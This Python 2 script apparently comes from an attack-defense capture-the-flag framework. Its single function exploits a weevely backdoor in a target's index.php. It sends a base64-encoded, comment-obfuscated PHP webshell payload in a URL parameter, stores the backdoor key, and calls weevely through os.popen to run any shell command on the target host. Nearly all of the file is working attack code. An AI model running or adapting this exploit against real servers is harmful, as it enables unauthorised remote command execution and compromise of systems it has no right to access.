#!/usr/bin/env python

from framework.http import http
from framework.config import *
from framework.function import *
from urllib import quote
import traceback

def vulnerable_attack(target,target_port,cmd):
        
    '''
    this is the payload script for vuln:
    
    weevely backdoor
    
    '''
    import os
    import hashlib 

    try:
        url = '/www/index.php?zipcode=ASD&birthday=00000000&skype=aa&m=misc&f=door&&id=base64%2CQCRfPSdzJy4ncycuLyotLyotKi8nZScuLyotLyotKi8ncic7IEAkXz0vKi0vKi0qLydhJy4vKi0vKi0qLyRfLi8qLS8qLSovJ3QnOyBAJF8vKi0vKi0qLygkLyotLyotKi97J19QJy4vKi0vKi0qLydPUycuLyotLyotKi8nVCd9IFsvKi0vKi0qLzAvKi0vKi0qLy0vKi0vKi0qLzIvKi0vKi0qLy0vKi0vKi0qLzUvKi0vKi0qL10pOw'
        # my_shared_key = hashlib.md5('haozigege').hexdigest()
        my_shared_key = 'ccd2e8f9'
        open('data/weevely.key','w').write(my_shared_key)
        system_cmd = "python utils/weevely3/weevely.py \"http://%s:%d%s\" haozigege \":shell_sh '%s'\" 2>&1"%(target,int(target_port),url,cmd)
        print system_cmd
        debug_print('system_cmd => ' + system_cmd)
        res = os.popen(system_cmd).read()
    except Exception,e:
        debug_print(traceback.format_exc())     
        dump_error(target,"attack failed","sample.py attack")
        res = "error"

    return res




